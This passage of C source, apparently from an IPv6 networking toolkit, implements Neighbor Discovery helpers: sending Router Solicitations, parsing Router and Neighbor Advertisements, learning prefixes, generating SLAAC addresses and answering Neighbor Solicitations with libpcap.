			/* 
			   Check that that the Destination Address of the Neighbor Advertisement is the one
			   that we used for sending the Neighbor Solicitation message
			 */
			if(!is_eq_in6_addr(&(pkt_ipv6->ip6_dst), &(ipv6->ip6_src)))
				continue;

			/* Check that the ICMPv6 checksum is correct */
			if(in_chksum(pkt_ipv6, pkt_na, pkt_end-((unsigned char *)pkt_na), IPPROTO_ICMPV6) != 0)
				continue;

			/* Check that the ICMPv6 Target Address is the one we had asked for */
			if(!is_eq_in6_addr(&(pkt_na->nd_na_target), targetaddr))
				continue;

			p= (unsigned char *) pkt_na + sizeof(struct nd_neighbor_advert);

			/* Process Neighbor Advertisement options */
			while( (p+sizeof(struct nd_opt_tlla)) <= pkt_end && (*(p+1) != 0)){
				if(*p == ND_OPT_TARGET_LINKADDR){
					if( (*(p+1) * 8) != sizeof(struct nd_opt_tlla))
						break;

					/* Got a response, so we shouln't time out */
					alarm(0);

					/* Save the link-layer address */
					*result_ether= *(struct ether_addr *) (p+2);
					foundaddr=1;
					break;
				}

				p= p + *(p+1) * 8;
			} /* Processing options */

		} /* Processing packets */

	} /* Resending Neighbor Solicitations */

	alarm(0);

	if(closefd_f)
		pcap_close(pfd);

	if( sigaction(SIGALRM, &old_sig, NULL) == -1){
		if(verbose_f>1)
			puts("Error setting up 'Alarm' signal");

		return(-1);
	}

	if(foundaddr)
		return 1;
	else
		return 0;
}


/*
 * Function: solicited_node()
 *
 * Obtains the Solicited-node multicast address corresponding to an IPv6 address.
 */

struct in6_addr solicited_node(const struct in6_addr *ipv6addr){
	struct in6_addr solicited;

	solicited.s6_addr16[0]= htons(0xff02);
	solicited.s6_addr16[1]= 0x0000;
	solicited.s6_addr16[2]= 0x0000;
	solicited.s6_addr16[3]= 0x0000;
	solicited.s6_addr16[4]= 0x0000;
	solicited.s6_addr16[5]= htons(0x0001);
	solicited.s6_addr16[6]= htons(0xff00) | ipv6addr->s6_addr16[6];
	solicited.s6_addr16[7]= ipv6addr->s6_addr16[7];

	return solicited;
}


/*
 * Function: ether_multicast()
 *
 * Obtains the Ethernet multicast address corresponding to an IPv6 multicast address.
 */

struct ether_addr ether_multicast(const struct in6_addr *ipv6addr){
	unsigned int i;
	struct ether_addr ether;

	ether.a[0]=0x33;
	ether.a[1]=0x33;

	for(i=2;i<6;i++)
		ether.a[i]= ipv6addr->s6_addr[i+10];

	return ether;
}


/*
 * Function: init_iface_data()
 *
 * Initializes the contents of "iface_data" structure
 */

int init_iface_data(struct iface_data *idata){
	bzero(idata, sizeof(struct iface_data));
	idata->local_retrans = 0;
	idata->local_timeout = 1;

	idata->ip6_global.prefix= prefix_local;
	idata->ip6_global.nprefix=0;
	idata->ip6_global.maxprefix= MAX_LOCAL_ADDRESSES;

	idata->prefix_ol.prefix= prefix_ols;
	idata->prefix_ol.nprefix= 0;
	idata->prefix_ol.maxprefix= MAX_PREFIXES_ONLINK;

	idata->prefix_ac.prefix= prefix_acs;
	idata->prefix_ac.nprefix= 0;
	idata->prefix_ac.maxprefix= MAX_PREFIXES_AUTO;

	return 0;
}


/*
 * Function: find_ipv6_router_full()
 *
 * Finds a local router (by means of Neighbor Discovery)
 */

int find_ipv6_router_full(pcap_t *pfd, struct iface_data *idata){
	struct pcap_pkthdr			*pkthdr;
	const u_char				*pktdata;
	struct ip6_hdr				*pkt_ipv6;
	struct nd_router_advert 	*pkt_ra;
	unsigned char				*pkt_end;
	volatile unsigned char		*ptr;
	volatile unsigned char		*p;

	unsigned char				buffer[65556];
	unsigned int 				rs_max_packet_size;
	struct ether_header 		*ether;
	unsigned char 				*v6buffer;
	struct ip6_hdr 				*ipv6;
	struct nd_router_solicit	*rs;
	struct nd_opt_slla 			*sllaopt;
	struct nd_opt_prefix_info	*pio;
	volatile unsigned int 		tries=0;
	volatile unsigned int 		foundrouter=0;
	struct sigaction 			new_sig, old_sig;
	unsigned char				closefd_f=0, error_f=0;
	int							result;

	rs_max_packet_size = idata->mtu;
	ether = (struct ether_header *) buffer;
	v6buffer = buffer + sizeof(struct ether_header);
	ipv6 = (struct ip6_hdr *) v6buffer;

	if(pfd == NULL){
		if( (pfd= pcap_open_live(idata->iface, PCAP_SNAP_LEN, PCAP_PROMISC, PCAP_TIMEOUT, errbuf)) == NULL){
			if(verbose_f>1)
				printf("pcap_open_live(): %s\n", errbuf);

			return(-1);
		}

		if( pcap_datalink(pfd) != DLT_EN10MB){
			if(verbose_f>1)
				printf("Error: Interface %s is not an Ethernet interface", idata->iface);

			return(-1);
		}

		closefd_f=1;
	}

	if(pcap_compile(pfd, &pcap_filter, PCAP_ICMPV6_RANS_FILTER, PCAP_OPT, PCAP_NETMASK_UNKNOWN) == -1){
		if(verbose_f>1)
			printf("pcap_compile(): %s", pcap_geterr(pfd));

		if(closefd_f)
			pcap_close(pfd);

		return(-1);
	}
    
	if(pcap_setfilter(pfd, &pcap_filter) == -1){
		if(verbose_f>1)
			printf("pcap_setfilter(): %s", pcap_geterr(pfd));

		if(closefd_f)
			pcap_close(pfd);

		return(-1);
	}

	pcap_freecode(&pcap_filter);

	ipv6->ip6_flow=0;
	ipv6->ip6_vfc= 0x60;
	ipv6->ip6_hlim= 255;
	ipv6->ip6_src= idata->ip6_local;

	if ( inet_pton(AF_INET6, ALL_ROUTERS_MULTICAST_ADDR, &(ipv6->ip6_dst)) <= 0){
		if(verbose_f>1)
			puts("inet_pton(): Error converting All Routers address from presentation to network format");

		if(closefd_f)
			pcap_close(pfd);

		return(-1);
	}

	ether->src = idata->ether;

	if(ether_pton(ETHER_ALLROUTERS_LINK_ADDR, &(ether->dst), sizeof(struct ether_addr)) == 0){
		if(verbose_f>1)
			puts("ether_pton(): Error converting all-nodes multicast address");

		if(closefd_f)
			pcap_close(pfd);

		return(-1);
	}

	ether->ether_type = htons(0x86dd);

	prev_nh = (unsigned char *) &(ipv6->ip6_nxt);
	*prev_nh = IPPROTO_ICMPV6;

	ptr = (unsigned char *) v6buffer + MIN_IPV6_HLEN;

	if( (ptr+sizeof(struct nd_router_solicit)) > (v6buffer+rs_max_packet_size)){
		if(verbose_f>1)
			puts("Packet too large while inserting Router Solicitation header");

		if(closefd_f)
			pcap_close(pfd);

		return(-1);
	}

	rs= (struct nd_router_solicit *) (ptr);

	rs->nd_rs_type = ND_ROUTER_SOLICIT;
	rs->nd_rs_code = 0;
	rs->nd_rs_reserved = 0;

	ptr += sizeof(struct nd_router_solicit);
	sllaopt = (struct nd_opt_slla *) ptr;    

	if( (ptr+sizeof(struct nd_opt_slla)) > (v6buffer+rs_max_packet_size)){
		if(verbose_f>1)
			puts("RS message too large while processing source link-layer addresss opt.");

		if(closefd_f)
			pcap_close(pfd);

		return(-1);
	}

	sllaopt->type= ND_OPT_SOURCE_LINKADDR;
	sllaopt->length= SLLA_OPT_LEN;
	bcopy( &(idata->ether.a), sllaopt->address, ETH_ALEN);
	ptr += sizeof(struct nd_opt_slla);

	ipv6->ip6_plen = htons((ptr - v6buffer) - MIN_IPV6_HLEN);
	rs->nd_rs_cksum = 0;
	rs->nd_rs_cksum = in_chksum(v6buffer, rs, ptr-((unsigned char *)rs), IPPROTO_ICMPV6);

	/* We set the signal handler, and the anchor for siglongjump() */
	canjump=0;
	bzero(&new_sig, sizeof(struct sigaction));
	sigemptyset(&new_sig.sa_mask);
	new_sig.sa_handler= &sig_alarm;

	alarm(0);

	if( sigaction(SIGALRM, &new_sig, &old_sig) == -1){
		if(verbose_f>1)
			puts("Error setting up 'Alarm' signal");

		if(closefd_f)
			pcap_close(pfd);

		return(-1);
	}

	if(sigsetjmp(env, 1) != 0)
		tries++;

	canjump=1;

	while(tries<3 && !foundrouter && !error_f){
		if((nw=pcap_inject(pfd, buffer, ptr - buffer)) == -1){
			if(verbose_f>1)
				printf("pcap_inject(): %s\n", pcap_geterr(pfd));

			error_f=1;
			break;
		}

		if(nw != (ptr-buffer)){
			if(verbose_f>1)
				printf("pcap_inject(): only wrote %lu bytes (rather than %lu bytes)\n", (LUI) nw, \
												(LUI) (ptr-buffer));

			error_f=1;
			break;
		}

		alarm(idata->local_timeout + 1);
		
		while(!foundrouter && !error_f){

			do{
				if( (result=pcap_next_ex(pfd, &pkthdr, &pktdata)) == -1){
					if(verbose_f>1)
						printf("pcap_next_ex(): %s", pcap_geterr(pfd));

					error_f=1;
					break;
				}
			}while(result==0);			

			if(error_f)
				break;

			pkt_ether = (struct ether_header *) pktdata;
			pkt_ipv6 = (struct ip6_hdr *)((char *) pkt_ether + ETHER_HDR_LEN);
			pkt_ra = (struct nd_router_advert *) ((char *) pkt_ipv6 + MIN_IPV6_HLEN);
			pkt_end = (unsigned char *) pktdata + pkthdr->caplen;


			/* The packet length is the minimum of what we capured, and what is specified in the
			   IPv6 Total Lenght field
			 */
			if( pkt_end > ((unsigned char *)pkt_ra + pkt_ipv6->ip6_plen) )
				pkt_end = (unsigned char *)pkt_ra + pkt_ipv6->ip6_plen;

			/*
			   Discard the packet if it is not of the minimum size to contain a Neighbor Advertisement
			   message with a source link-layer address option
			 */
			if( (pkt_end - (unsigned char *) pkt_ra) < (sizeof(struct nd_router_advert) + \
										sizeof(struct nd_opt_slla)))
				continue;

			/*
			   Neighbor Discovery packets must have a Hop Limit of 255
			 */
			if(pkt_ipv6->ip6_hlim != 255)
				continue;

			/*
			   Check that the IPv6 Source Address of the Router Advertisement is an IPv6 link-local
			   address.
			 */
			if( (pkt_ipv6->ip6_src.s6_addr16[0] & htons(0xffc0)) != htons(0xfe80))
				continue;

			/* 
			   Check that that the Destination Address of the Router Advertisement is either the one
			   that we used for sending the Router Solicitation message or a multicast address 
			   (typically the all-nodes)
			 */
			if(!is_eq_in6_addr(&(pkt_ipv6->ip6_dst), &(ipv6->ip6_src)) \
					&& !IN6_IS_ADDR_MULTICAST(&(pkt_ipv6->ip6_dst)))
				continue;

			/* Check that the ICMPv6 checksum is correct. If the received checksum is valid,
			   and we compute the checksum over the received packet (including the Checkdum field)
			   the result is 0. Otherwise, the packet has been corrupted.
			*/
			if(in_chksum(pkt_ipv6, pkt_ra, pkt_end- (unsigned char *)pkt_ra, IPPROTO_ICMPV6) != 0)
				continue;

			p= (unsigned char *) pkt_ra + sizeof(struct nd_router_advert);

			/* Process Router Advertisement options */
			while( (p+ *(p+1) * 8) <= pkt_end && *(p+1)!=0 && !error_f){
				switch(*p){
					case ND_OPT_SOURCE_LINKADDR:
						if( (*(p+1) * 8) != sizeof(struct nd_opt_tlla))
							break;

						/* Got a response, so we shouln't time out */
						alarm(0);

						/* Save the link-layer address */
						idata->router_ether = *(struct ether_addr *) (p+2);
						idata->router_ip6= pkt_ipv6->ip6_src;
						foundrouter=1;
						break;

					case ND_OPT_PREFIX_INFORMATION:
						if(*(p+1) != 4)
							break;

						pio= (struct nd_opt_prefix_info *) p;

						if((idata->prefix_ol.nprefix) < idata->prefix_ol.maxprefix){
							if( (pio->nd_opt_pi_flags_reserved & ND_OPT_PI_FLAG_ONLINK) && \
								(pio->nd_opt_pi_prefix_len <= 128) && !is_ip6_in_prefix_list(&(pio->nd_opt_pi_prefix), \
								&(idata->prefix_ol))){

								if( (idata->prefix_ol.prefix[idata->prefix_ol.nprefix] = \
																		malloc(sizeof(struct prefix_entry))) == NULL){
									if(verbose_f>1)
										puts("Error in malloc() while learning prefixes");

									error_f=1;
									break;
								}

								(idata->prefix_ol.prefix[idata->prefix_ol.nprefix])->ip6= pio->nd_opt_pi_prefix;
								(idata->prefix_ol.prefix[idata->prefix_ol.nprefix])->len= pio->nd_opt_pi_prefix_len;
								sanitize_ipv6_prefix(&((idata->prefix_ol.prefix[idata->prefix_ol.nprefix])->ip6), \
														(idata->prefix_ol.prefix[idata->prefix_ol.nprefix])->len);
								(idata->prefix_ol.nprefix)++;
							}
						}

						if(idata->prefix_ac.nprefix < idata->prefix_ac.maxprefix){
							if( (pio->nd_opt_pi_flags_reserved & ND_OPT_PI_FLAG_AUTO) && \
								(pio->nd_opt_pi_prefix_len == 64) && !is_ip6_in_prefix_list(&(pio->nd_opt_pi_prefix), \
																							&(idata->prefix_ac))){

								if((idata->prefix_ac.prefix[idata->prefix_ac.nprefix] = \
																		malloc(sizeof(struct prefix_entry))) == NULL){
									if(verbose_f>1)
										puts("Error in malloc() while learning prefixes");

									error_f=1;
									break;
								}

								(idata->prefix_ac.prefix[idata->prefix_ac.nprefix])->ip6= \
												pio->nd_opt_pi_prefix;
								(idata->prefix_ac.prefix[idata->prefix_ac.nprefix])->len= \
												pio->nd_opt_pi_prefix_len;

								sanitize_ipv6_prefix(&((idata->prefix_ac.prefix[idata->prefix_ac.nprefix])->ip6), \
														(idata->prefix_ac.prefix[idata->prefix_ac.nprefix])->len);

								if(!idata->ip6_global_flag && idata->ip6_global.nprefix < idata->ip6_global.maxprefix){
								
									if( (idata->ip6_global.prefix[idata->ip6_global.nprefix] = \
																	malloc(sizeof(struct prefix_entry))) == NULL){
										if(verbose_f>1)
											puts("Error in malloc() creating local SLAAC addresses");

										error_f=1;
										break;
									}

									generate_slaac_address(&(idata->prefix_ac.prefix[idata->prefix_ac.nprefix]->ip6), \
										&(idata->ether), &((idata->ip6_global.prefix[idata->ip6_global.nprefix])->ip6));
									(idata->ip6_global.prefix[idata->ip6_global.nprefix])->len = 64;
									(idata->ip6_global.nprefix)++;
								}
								(idata->prefix_ac.nprefix)++;
							}
						}

						break;
				}

				p= p + *(p+1) * 8;
			} /* Processing options */

		} /* Processing packets */

	} /* Resending Router Solicitations */

	/* If we added at least one global address, we set the corresponding flag to 1 */
	if(idata->ip6_global.nprefix)
		idata->ip6_global_flag=1;

	if(closefd_f)
		pcap_close(pfd);

	if( sigaction(SIGALRM, &old_sig, NULL) == -1){
		if(verbose_f>1)
			puts("Error setting up 'Alarm' signal");

		return(-1);
	}

	if(error_f){
		return(-1);
	}
	else if(foundrouter)
		return 1;
	else
		return 0;
}



/*
 * Function: is_eq_in6_addr()
 *
 * Compares two IPv6 addresses. Returns 0 if they are equal.
 */

int is_eq_in6_addr(struct in6_addr *ip1, struct in6_addr *ip2){
	unsigned int i;

	for(i=0; i<8; i++)
		if(ip1->s6_addr16[i] != ip2->s6_addr16[i])
			return 0;

	return 1;
}


/*
 * Function: ether_to_ipv6_linklocal()
 *
 * Generates an IPv6 link-local address (with modified EUI-64 identifiers) based on
 * an Ethernet address.
 */

void ether_to_ipv6_linklocal(struct ether_addr *etheraddr, struct in6_addr *ipv6addr){
	ipv6addr->s6_addr16[0]= htons(0xfe80); /* Link-local unicast prefix */

	for(i=1;i<4;i++)
		ipv6addr->s6_addr16[i]=0x0000;

	ipv6addr->s6_addr16[4]=  htons(((u_int16_t)etheraddr->a[0] << 8) | etheraddr->a[1]);
	ipv6addr->s6_addr16[5]=  htons( ((u_int16_t)etheraddr->a[2] << 8) | 0xff);
	ipv6addr->s6_addr16[6]=  htons((u_int16_t) 0xfe00 | etheraddr->a[3]);
	ipv6addr->s6_addr16[7]=  htons(((u_int16_t)etheraddr->a[4] << 8) | etheraddr->a[5]);
}




/*
 * Handler for the ALARM signal.
 *
 * Used for setting a timeout on libpcap reads
 */

void sig_alarm(int num){
	if(canjump == 0)
		return;

	siglongjmp(env, 1);
}


/*
 * Function: get_if_addrs()
 *
 * Obtains Ethernet and IPv6 addresses of a network interface card
 */

int get_if_addrs(struct iface_data *idata){
	struct ifaddrs	*ifptr, *ptr;
	struct sockaddr_in6	*sockin6ptr;

#ifdef __linux__
	struct sockaddr_ll	*sockpptr;
#elif defined (__FreeBSD__) || defined(__NetBSD__) || defined (__OpenBSD__) || defined(__APPLE__)
	struct sockaddr_dl	*sockpptr;
#endif

	if(getifaddrs(&ifptr) != 0){
		if(verbose_f > 1){
			printf("Error while learning addresses of the %s interface\n", idata->iface);
		}
		return(-1);
	}

	for(ptr=ifptr; ptr != NULL; ptr= ptr->ifa_next){
		if(ptr->ifa_addr == NULL)
			continue;

#ifdef __linux__
		if( !(idata->ether_flag) && ((ptr->ifa_addr)->sa_family == AF_PACKET)){
			if(strncmp(idata->iface, ptr->ifa_name, IFACE_LENGTH-1) == 0){
				sockpptr = (struct sockaddr_ll *) (ptr->ifa_addr);
				if(sockpptr->sll_halen == ETHER_ADDR_LEN){
					memcpy((idata->ether).a, sockpptr->sll_addr, ETHER_ADDR_LEN);
					idata->ether_flag=1;
				}
			}
		}
#elif defined (__FreeBSD__) || defined(__NetBSD__) || defined (__OpenBSD__) || defined(__APPLE__)
		if( !(idata->ether_flag) && ((ptr->ifa_addr)->sa_family == AF_LINK)){
			if(strncmp(idata->iface, ptr->ifa_name, IFACE_LENGTH-1) == 0){
				sockpptr = (struct sockaddr_dl *) (ptr->ifa_addr);
				if(sockpptr->sdl_alen == ETHER_ADDR_LEN){
					memcpy((idata->ether).a, (sockpptr->sdl_data + sockpptr->sdl_nlen), ETHER_ADDR_LEN);
					idata->ether_flag= 1;
				}
			}
		}
#endif
		else if((ptr->ifa_addr)->sa_family == AF_INET6){
			sockin6ptr= (struct sockaddr_in6 *) (ptr->ifa_addr);

			if( !(idata->ip6_local_flag) &&  (((sockin6ptr->sin6_addr).s6_addr16[0] & htons(0xffc0)) \
															== htons(0xfe80))){
				if(strncmp(idata->iface, ptr->ifa_name, IFACE_LENGTH-1) == 0){
					idata->ip6_local = sockin6ptr->sin6_addr;
#if defined (__FreeBSD__) || defined(__NetBSD__) || defined (__OpenBSD__) || defined(__APPLE__)
					/* BSDs store the interface index in s6_addr16[1], so we must clear it */
					idata->ip6_local.s6_addr16[1] =0;
					idata->ip6_local.s6_addr16[2] =0;
					idata->ip6_local.s6_addr16[3] =0;					
#endif
					idata->ip6_local_flag= 1;
				}
			}
			else if( ((sockin6ptr->sin6_addr).s6_addr16[0] & htons(0xffc0)) != htons(0xfe80)){
				if(strncmp(idata->iface, ptr->ifa_name, IFACE_LENGTH-1) == 0){
					if(IN6_IS_ADDR_LOOPBACK(&(sockin6ptr->sin6_addr)))
						idata->flags= IFACE_LOOPBACK;

					if(!is_ip6_in_prefix_list( &(sockin6ptr->sin6_addr), &(idata->ip6_global))){
						if(idata->ip6_global.nprefix < idata->ip6_global.maxprefix){
							if( (idata->ip6_global.prefix[idata->ip6_global.nprefix] = \
												malloc(sizeof(struct prefix_entry))) == NULL){
								if(verbose_f > 1)
									puts("Error while storing Source Address");

								freeifaddrs(ifptr);
								return(-1);
							}

							(idata->ip6_global.prefix[idata->ip6_global.nprefix])->len = 64;
							(idata->ip6_global.prefix[idata->ip6_global.nprefix])->ip6 = sockin6ptr->sin6_addr;
							idata->ip6_global.nprefix++;
							idata->ip6_global_flag= 1;
						}
					}
				}
			}
		}
	}

	freeifaddrs(ifptr);
	return(0);
}


/*
 * Function: is_ip6_in_list()
 *
 * Checks whether an IPv6 address is present in an address list.
 */

int is_ip6_in_prefix_list(struct in6_addr *target, struct prefix_list *plist){
	unsigned int i, j, full16, rest16;
	u_int16_t	mask16;

	for(i=0; i < plist->nprefix; i++){
		full16=(plist->prefix[i])->len / 16;
		rest16=(plist->prefix[i])->len % 16;
		mask16 = 0xffff;

		for(j=0; j < full16; j++)
			if(target->s6_addr16[j] != (plist->prefix[i])->ip6.s6_addr16[j])
				break;

		if( (j == full16) && rest16){
			mask16 = mask16 << (16 - rest16);

			if( (target->s6_addr16[full16] & mask16) == ((plist->prefix[i])->ip6.s6_addr16[full16] & mask16))
				return 1;
		}
	}

	return 0;
}


/*
 * match_ipv6_to_prefixes()
 *
 * Finds out whether an IPv6 address matches any IPv6 prefix in an array
 */

int match_ipv6_to_prefixes(struct in6_addr *ipv6addr, struct prefix_list *pf){
	unsigned int	i, j, full16, rbits;
	u_int16_t	mask;

	for(i=0; i < pf->nprefix; i++){
		full16= (pf->prefix[i])->len/16;
		for(j=0; j<full16; j++){
			if(ipv6addr->s6_addr16[j] != (pf->prefix[i])->ip6.s6_addr16[j])
				break;
		}

		if(j == full16){
			if((rbits= (pf->prefix[i])->len%16) == 0)
				return 1;
			else{
				mask= 0xffff;
				mask= mask<<rbits;
				if((pf->prefix[i])->ip6.s6_addr16[full16] == (ipv6addr->s6_addr16[full16] & htons(mask)))
					return 1;
			}
		}
	}

	return 0;
}


/*
 * Function: generate_slaac_address()
 *
 * Generates an IPv6 address (with modified EUI-64 identifiers) based on
 * a IPv6 prefix and an Ethernet address.
 */

void generate_slaac_address(struct in6_addr *prefix, struct ether_addr *etheraddr, struct in6_addr *ipv6addr){
	ipv6addr->s6_addr16[0]= htons(0xfe80); /* Link-local unicast prefix */

	for(i=0;i<4;i++)
		ipv6addr->s6_addr16[i]= prefix->s6_addr16[i];

	ipv6addr->s6_addr16[4]=  htons(((u_int16_t) (etheraddr->a[0] | 0x02) << 8) | etheraddr->a[1]);
	ipv6addr->s6_addr16[5]=  htons( ((u_int16_t)etheraddr->a[2] << 8) | 0xff);
	ipv6addr->s6_addr16[6]=  htons((u_int16_t) 0xfe00 | etheraddr->a[3]);
	ipv6addr->s6_addr16[7]=  htons(((u_int16_t)etheraddr->a[4] << 8) | etheraddr->a[5]);
}



/*
 * Function: src_addr_sel()
 *
 * Selects a Source Address for a given Destination Address
 */

struct in6_addr *src_addr_sel(struct iface_data *idata, struct in6_addr *dst){
	u_int16_t	mask16;
	unsigned int	i, j, full16, rest16;
	/*
	   If the destination address is a link-local address, we select our link-local
	   address as the Source Address. If the dst address is a global unicast address
	   we select our first matching address, or else our first global address.
	   Worst case scenario, we don't have global address and must use our link-local
	   address.
	*/   

	if( (dst->s6_addr16[0] & htons(0xffc0)) == htons(0xfe80)){
		return( &(idata->ip6_local));
	}
	else if(IN6_IS_ADDR_MC_LINKLOCAL(dst) || IN6_IS_ADDR_LINKLOCAL(dst)){
		return( &(idata->ip6_local));
	}
	else if(idata->ip6_global_flag){
		for(i=0; i < idata->ip6_global.nprefix; i++){
				full16=(idata->ip6_global.prefix[i])->len / 16;
				rest16=(idata->ip6_global.prefix[i])->len % 16;
				mask16 = 0xffff;

				for(j=0; j < full16; j++)
					if( dst->s6_addr16[j] != (idata->ip6_global.prefix[i])->ip6.s6_addr16[j])
						break;

				if( (j == full16) && rest16){
					mask16 = mask16 << (16 - rest16);

					if( (dst->s6_addr16[full16] & mask16) == ((idata->ip6_global.prefix[i])->ip6.s6_addr16[full16] & mask16))
						return( &((idata->ip6_global.prefix[i])->ip6));
				}
		}

		return( &((idata->ip6_global.prefix[0])->ip6));
	}
	else{
		return( &(idata->ip6_local));
	}
}


/*
 * Function: send_neighbor_advertisement()
 *
 * Send a Neighbor advertisement in response to a Neighbor Solicitation message
 */

int send_neighbor_advert(struct iface_data *idata, pcap_t *pfd,  const u_char *pktdata){
	struct ether_header			*pkt_ether;
	struct ip6_hdr				*pkt_ipv6;
	struct nd_neighbor_solicit	*pkt_ns;
	unsigned char				*ptr;
	struct ether_header			*ethernet;
	unsigned char 				*v6buffer;
	struct ip6_hdr				*ipv6;
	struct nd_neighbor_advert	*na;
	struct nd_opt_tlla			*tllaopt;
	unsigned char				wbuffer[2500];

	if(idata->mtu > sizeof(wbuffer)){
		if(verbose_f)
			puts("send_neighbor_advert(): Internal buffer too small");

		return(-1);
	}

	ethernet= (struct ether_header *) wbuffer;
	v6buffer = (unsigned char *) ethernet + sizeof(struct ether_header);
	ipv6 = (struct ip6_hdr *) v6buffer;
	na= (struct nd_neighbor_advert *) ((char *) v6buffer + MIN_IPV6_HLEN);
	ptr = (unsigned char *) na;

	pkt_ether = (struct ether_header *) pktdata;
	pkt_ipv6 = (struct ip6_hdr *)((char *) pkt_ether + ETHER_HDR_LEN);
	pkt_ns = (struct nd_neighbor_solicit *) ((char *) pkt_ipv6 + MIN_IPV6_HLEN);

	ethernet->ether_type = htons(0x86dd);
	ipv6->ip6_flow=0;
	ipv6->ip6_vfc= 0x60;
	ipv6->ip6_hlim= 255;
	ipv6->ip6_nxt= IPPROTO_ICMPV6;

	if( (ptr+sizeof(struct nd_neighbor_advert)) > (v6buffer+idata->mtu)){
		if(verbose_f)
			puts("send_neighbor_advert(): Packet too large when sending Neighbor Advertisement");

		return(-1);
	}

	na->nd_na_type = ND_NEIGHBOR_ADVERT;
	na->nd_na_code = 0;
	ptr += sizeof(struct nd_neighbor_advert);

	if( (ptr+sizeof(struct nd_opt_tlla)) <= (v6buffer+idata->mtu) ){
		tllaopt = (struct nd_opt_tlla *) ptr;
		tllaopt->type= ND_OPT_TARGET_LINKADDR;
		tllaopt->length= TLLA_OPT_LEN;
		bcopy(idata->ether.a, tllaopt->address, ETH_ALEN);
		ptr += sizeof(struct nd_opt_tlla);
	}
	else{
		if(verbose_f)
			puts("send_neighbor_advert(): Packet Too Large while inserting TLLA option in NA message");

		return(-1);
	}

	/* If the IPv6 Source Address of the incoming Neighbor Solicitation is the unspecified 
	   address (::), the Neighbor Advertisement must be directed to the IPv6 all-nodes 
	   multicast address (and the Ethernet Destination address should be 33:33:33:00:00:01). 
	   Otherwise, the Neighbor Advertisement is sent to the IPv6 Source Address (and 
	   Ethernet Source Address) of the incoming Neighbor Solicitation message
	 */
	pkt_ipv6addr = &(pkt_ipv6->ip6_src);

	if(IN6_IS_ADDR_UNSPECIFIED(pkt_ipv6addr)){
		na->nd_na_flags_reserved = 0;

		if ( inet_pton(AF_INET6, ALL_NODES_MULTICAST_ADDR, &(ipv6->ip6_dst)) <= 0){
			if(verbose_f)
				puts("send_neighbor_advert(): Error converting all-nodes multicast address");

			return(-1);
		}

		if(ether_pton(ETHER_ALLNODES_LINK_ADDR, &(ethernet->dst), ETHER_ADDR_LEN) == 0){
			if(verbose_f)
				puts("send_neighbor_advert(): Error converting all-nodes link-local address");

			return(-1);
		}
	}
	else{
		ipv6->ip6_dst = pkt_ipv6->ip6_src;
		ethernet->dst = pkt_ether->src;

		/* 
		   Set the "Solicited" flag if NS was sent from an address other than the unspecified
		   address (i.e., the response will be unicast). 
		 */ 

		na->nd_na_flags_reserved =  ND_NA_FLAG_OVERRIDE | ND_NA_FLAG_SOLICITED;
	}

	ethernet->src = idata->ether;

	/* 
	   If the Neighbor Solicitation message was directed to one of our unicast addresses, the IPv6 Source
	   Address is set to that address. Otherwise, we set the IPv6 Source Address to our link-local address.
	 */

	pkt_ipv6addr = &(pkt_ipv6->ip6_dst);

	if(IN6_IS_ADDR_MULTICAST(pkt_ipv6addr)){
		ipv6->ip6_src = idata->ip6_local;
	}
	else{
		if(is_eq_in6_addr(pkt_ipv6addr, &(idata->ip6_local))){
			ipv6->ip6_src = idata->ip6_local;	
		}
		else if(idata->ip6_global_flag){
			for(i=0; i < idata->ip6_global.nprefix; i++){
				if(is_eq_in6_addr(pkt_ipv6addr, &((idata->ip6_global.prefix[i])->ip6))){
					ipv6->ip6_src = (idata->ip6_global.prefix[i])->ip6;	
					break;
				}
			}

			if(i == idata->ip6_global.nprefix)
				return 0;
		}
		else{
			return 0;
 		}
	}

	na->nd_na_target= pkt_ns->nd_ns_target;

	na->nd_na_cksum = 0;
	na->nd_na_cksum = in_chksum(v6buffer, na, ptr-((unsigned char *)na), IPPROTO_ICMPV6);

	ipv6->ip6_plen = htons((ptr - v6buffer) - MIN_IPV6_HLEN);

	if((nw=pcap_inject(pfd, wbuffer, ptr - wbuffer)) == -1){
		if(verbose_f)
			printf("send_neighbor_advert(): pcap_inject(): %s", pcap_geterr(pfd));

		return(-1);
	}

	if(nw != (ptr-wbuffer)){
		if(verbose_f)
			printf("send_neighbor_advert(): pcap_inject(): only wrote %lu bytes "
							"(rather than %lu bytes)\n", (LUI) nw, (LUI) (ptr-wbuffer));

		return(-1);
	}

	return 0;
}



/*
 * Function: valid_icmp6_response()
 *
 * Checks whether the response to an ICMPv6 probe is valid
 */

int valid_icmp6_response(struct iface_data *idata, struct pcap_pkthdr *pkthdr, const u_char *pktdata){

	struct ether_header	*pkt_ether;
	struct ip6_hdr		*pkt_ipv6, *pkt_ipv6_ipv6;
	struct ip6_ext		*pkt_ext;
	struct icmp6_hdr	*pkt_icmp6, *pkt_icmp6_icmp6;
	struct ip6_frag		*pkt_fh_fh;
	unsigned char		*pkt_end, *pkt_ptr;
	u_int8_t			pkt_prev_nh;
	unsigned int		minfragsize;

	pkt_ether = (struct ether_header *) pktdata;
	pkt_ipv6 = (struct ip6_hdr *)((char *) pkt_ether + linkhsize);
	pkt_icmp6 = (struct icmp6_hdr *) ((char *) pkt_ipv6 + MIN_IPV6_HLEN);
	pkt_icmp6_icmp6= (struct icmp6_hdr *) ((unsigned char *) pkt_icmp6 + sizeof(struct icmp6_hdr) +\
						sizeof(struct ip6_hdr) + MIN_HBH_LEN);

	pkt_end = (unsigned char *) pktdata + pkthdr->caplen;

	/* The packet length is the minimum of what we capured, and what is specified in the
	   IPv6 Total Lenght field
	 */
	if( pkt_end > ((unsigned char *)pkt_icmp6 + pkt_ipv6->ip6_plen) )
		pkt_end = (unsigned char *)pkt_icmp6 + pkt_ipv6->ip6_plen;

	switch(pkt_icmp6->icmp6_type){
		case ICMP6_ECHO_REPLY:
			/*
			   Discard the packet if it is not of the minimum size to contain an ICMPv6 
			   header and the payload we included in the ICMPv6 Echo Request
			 */
			if( (pkt_end - (unsigned char *) pkt_icmp6) < (sizeof(struct icmp6_hdr) + \
									fsize) && (pkt_end - (unsigned char *) pkt_ipv6) < MIN_IPV6_MTU){
				return 0;
			}

			/* Check that the ICMPv6 checksum is correct */
			if(in_chksum(pkt_ipv6, pkt_icmp6, pkt_end-((unsigned char *)pkt_icmp6), IPPROTO_ICMPV6) != 0){
				return 0;
			}

			if(pkt_icmp6->icmp6_data16[0] != htons(getpid())){
				return 0;
			}


			if(tstamp_f){
				pkt_ptr= ((unsigned char *) pkt_icmp6+ sizeof(struct icmp6_hdr));
